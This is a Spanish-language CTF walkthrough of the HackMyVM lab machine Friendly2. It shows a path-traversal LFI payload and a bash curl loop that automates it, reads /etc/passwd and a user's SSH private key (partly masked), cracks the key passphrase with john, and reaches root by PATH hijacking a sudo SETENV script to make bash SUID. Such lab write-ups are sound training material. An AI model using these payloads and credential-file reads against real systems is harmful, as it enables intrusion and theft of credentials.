---
date: 2023-05-10 12:00:00
layout: post
title: Friendly2 Writeup
subtitle: Writeup de la máquina Friendly2 de la plataforma HackMyVm
description: Realizaré la máquina Friendly2 explicando el procedimiento para lograr pwnearla. Esta máquina tiene una dificultad facil.
image: https://blogger.googleusercontent.com/img/a/AVvXsEi3xBOqeSct11w-W6DTugjPdwecP_gRdmUBAILlRZK3M5uJAJ4URqNA8QG0rpF_3WTO9BCPB1E8kbXZmImEBofOCLk2IbgAc-NnwyVEyZ0-63YHFnZjGOeLTJvt7n5x44pPwSST-uK4jbqHeuz_pTn5v1cLlXBCHa2UXKjmM2FR2LOt5NtNSansiYTp=w1200-h630-p-k-no-nu
optimized_image: https://blogger.googleusercontent.com/img/a/AVvXsEi3xBOqeSct11w-W6DTugjPdwecP_gRdmUBAILlRZK3M5uJAJ4URqNA8QG0rpF_3WTO9BCPB1E8kbXZmImEBofOCLk2IbgAc-NnwyVEyZ0-63YHFnZjGOeLTJvt7n5x44pPwSST-uK4jbqHeuz_pTn5v1cLlXBCHa2UXKjmM2FR2LOt5NtNSansiYTp=w1200-h630-p-k-no-nu
category: Writeup
tags:
  - HackMyVm
  - Writeup
  - Easy
author: FredBrave
---
<img class="img" src="/assets/img/machines/Friendly2/base.png" width="1000">
Esta maquina fue hecha por Rijaba, la maquina tiene una dificultad easy y las técnicas a utilizar para pwnearla son sencillas.
# Enumeración
Trataremos de encontrar la ip de la maquina por medio de la herramienta arp-scan.
```bash
sudo arp-scan 10.0.2.0/24
Interface: eth0, type: EN10MB, MAC: 08:00:27:ec:3f:6c, IPv4: 10.0.2.48
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1	52:54:00:12:35:00	QEMU
10.0.2.2	52:54:00:12:35:00	QEMU
10.0.2.3	08:00:27:5f:8b:b8	PCS Systemtechnik GmbH
10.0.2.110	08:00:27:0c:8f:a4	PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.000 seconds (128.00 hosts/sec). 4 responded
```
Una vez encontrada la maquina haremos un escaneo rápido a esta de todos los puertos. Encontrados los puertos abiertos ejecutaremos un escaneo mas exhaustivo hacia estos para encontrar versiones y verificar los servicios que corren en estos.
```bash
$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.0.2.110 -oG Targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-10 12:33 EDT
Nmap scan report for 10.0.2.110
Host is up (0.00011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:0C:8F:A4 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.36 seconds

$ sudo nmap -p22,80 -sCV 10.0.2.110 -oN Target
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-10 12:35 EDT
Nmap scan report for 10.0.2.110
Host is up (0.00041s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 74fdf1a7475bad8e8a3102fe44289fd2 (RSA)
|   256 16f0de5109fffc08a29a69a0ad42a048 (ECDSA)
|_  256 650eed44e23ef0e7600c759363952056 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Servicio de Mantenimiento de Ordenadores
MAC Address: 08:00:27:0C:8F:A4 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.13 seconds
```
Hemos descubierto el puerto 80 y 22 abiertos en la maquina.
Enumeramos la web para tratar de encontrar informacion importante.
<img class="img" src="/assets/img/machines/Friendly2/1.png" width="1000">
# Shell como gh0st
Al no encontrar nada importante intento un fuzz para enumerar rutas en la web.
```bash
ffuf -u http://10.0.2.110/FUZZ -w /home/kali/Ayuditas/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -e .php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.2.110/FUZZ
 :: Wordlist         : FUZZ: /home/kali/Ayuditas/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 5ms]
    * FUZZ: assets

[Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 698ms]
    * FUZZ: tools

[Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 19ms]
    * FUZZ: .php

[Status: 200, Size: 2698, Words: 800, Lines: 92, Duration: 19ms]
    * FUZZ: 

[Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 10ms]
    * FUZZ: server-status
```
Entro a la ruta tools la cual parece ser una ruta a la que no deberia tener acceso.
<img class="img" src="/assets/img/machines/Friendly2/2.png" width="800">
Al hacer un CTRL + U encuentro rapidamente un comentario de mi interés.
<img class="img" src="/assets/img/machines/Friendly2/3.png" width="800">
Verificando si existe dicha ruta la encuentro en tools.
<img class="img" src="/assets/img/machines/Friendly2/4.png" width="800">
Parece ser un php que manda a llamar archivos para mostrarlos.
Al no encontrar mucho intento realizar un LFI y tengo exito.
http://10.0.2.110/tools/check\_if\_exist.php?doc=../../../../../etc/passwd
<img class="img" src="/assets/img/machines/Friendly2/5.png" width="800">
Para explotar esto de manera mas comoda cree el siguiente script en bash.
```bash
#!/bin/bash
while true
do
  read -p "Ruta a buscar: " Myinput
  curl -s -X GET http://$1/tools/check_if_exist.php?doc=../../../../../$Myinput
done
```
El cual se usa de la siguiente forma
```bash
./lfi.sh 10.0.2.110
Ruta a buscar: /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
gh0st:x:1001:1001::/home/gh0st:/bin/bash
```
Encontramos un usuario llamado gh0st al tener esta informacion podemos tratar de conseguir la id\_rsa de dicho usuario.
```bash
./lfi.sh 10.0.2.110
Ruta a buscar: /home/gh0st/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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************
**********************************************************************
*****************************
-----END OPENSSH PRIVATE KEY-----
```
Encontramos la llave privada del usuario gh0st. La copiamos he ingresamos a un archivo y a dicho archivo le daremos permisos 600.
Al intentar ingresar con la llave a la maquina me pide una pasphrase, esto quiere decir que la llave esta encriptada por lo que debemos desencriptarla.
```bash
$ chmod 600 id_rsa
$ ssh -i id_rsa gh0st@10.0.2.110
Enter passphrase for key 'id_rsa':
```
Para desencriptar la llave usaremos la herramienta john.
```bash
$ ssh2john id_rsa > hash
$ john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
****ic           (id_rsa)     
1g 0:00:00:07 DONE (2023-05-10 11:38) 0.1396g/s 35.75p/s 35.75c/s 35.75C/s tiffany..freedom
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Y tenemos la clave de la id\_rsa.
```bash
ssh -i id_rsa gh0st@10.0.2.110
Enter passphrase for key 'id_rsa': 
Linux friendly2 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
-bash-5.1$ whoami
gh0st
```
# Shell como root
Al hacer un sudo -l encontre que podemos ejecutar un script de root como cualquier usuario. Ademas del SETENV.
```bash
-bash-5.1$ sudo -l
Matching Defaults entries for gh0st on friendly2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gh0st may run the following commands on friendly2:
    (ALL : ALL) SETENV: NOPASSWD: /opt/security.sh
-bash-5.1$
```
Viendo el contenido del script me doy cuenta de que hay varias rutas relativas y no absolutas y con el permiso SETENV deberiamos de poder realizar un pathhijacking exitoso.
Intente realizar el pathhijacking con otros de los comandos dentro del script, pero me funciono al intentar con tr. 
```bash
-bash-5.1$ cat tr
#!/bin/bash
chmod +s /bin/bash
-bash-5.1$ chmod +x tr
-bash-5.1$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/games
-bash-5.1$ PATH=/tmp:$PATH
-bash-5.1$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/games
-bash-5.1$ sudo -u 'root' PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/games /opt/security.sh
Enter the string to encode:
as
Original string: as
Encoded string: 
-bash-5.1$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```
Con esto hemos pwneado la maquina!!!
```bash
-bash-5.1$ bash -p
bash-5.1# whoami
root
```
Para la flag de root tienen que hacer un reto Suerte!!!

